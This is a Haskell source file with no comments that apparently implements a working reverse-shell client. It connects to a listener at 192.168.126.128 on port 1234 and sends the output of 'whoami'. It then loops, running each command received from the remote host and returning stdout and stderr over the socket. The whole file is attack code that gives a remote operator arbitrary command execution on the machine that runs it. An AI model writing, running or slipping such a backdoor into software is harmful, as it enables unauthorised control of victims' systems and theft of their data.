import Network.Socket hiding (send, sendTo, recv, recvFrom)
import Network.Socket.ByteString (send, recv)
import qualified Data.ByteString.Char8 as B8
import System.Process
import System.IO
import Control.Exception

main = do
        client "192.168.126.128" 1234

client :: String -> Int -> IO ()
client host port = withSocketsDo $ do
                addrInfo <- getAddrInfo Nothing (Just host) (Just $ show port)
                let serverAddr = head addrInfo
                sock <- socket (addrFamily serverAddr) Stream defaultProtocol
                connect sock (addrAddress serverAddr)
                (_, Just hout, _, _) <- createProcess (proc "whoami" []) {std_out = CreatePipe}
                resultOut <- hGetContents hout
                let resultMsg = B8.pack resultOut
                send sock resultMsg
                msgSender sock
                close sock

msgSender :: Socket -> IO ()
msgSender sock = do
  let msg = B8.pack ""
  send sock msg
  rMsg <- recv sock 1024
  let split_cmd = words (filter (/= '\n') (B8.unpack rMsg))
  result <- try' $ createProcess (proc (head split_cmd) (tail split_cmd)) {std_out = CreatePipe, std_err = CreatePipe}
  case result of 
    Left ex                            -> sendError sock ex
    Right (_, Just hout, Just herr, _) -> sendResult sock (Nothing, Just hout, Just herr, Nothing)
  msgSender sock
  
 
try' :: IO a -> IO (Either IOException a)
try' = try

sendError sock err = do
  let errorMsg = B8.pack ("Error:" ++ show err ++ "\n")
  send sock errorMsg
  
sendResult sock (_, Just hout, Just herr, _) = do
    resultOut <- hGetContents hout
    errorOut <- hGetContents herr
    let resultMsg = B8.pack resultOut
    let errorMsg = B8.pack errorOut
    send sock resultMsg
    send sock errorMsg
  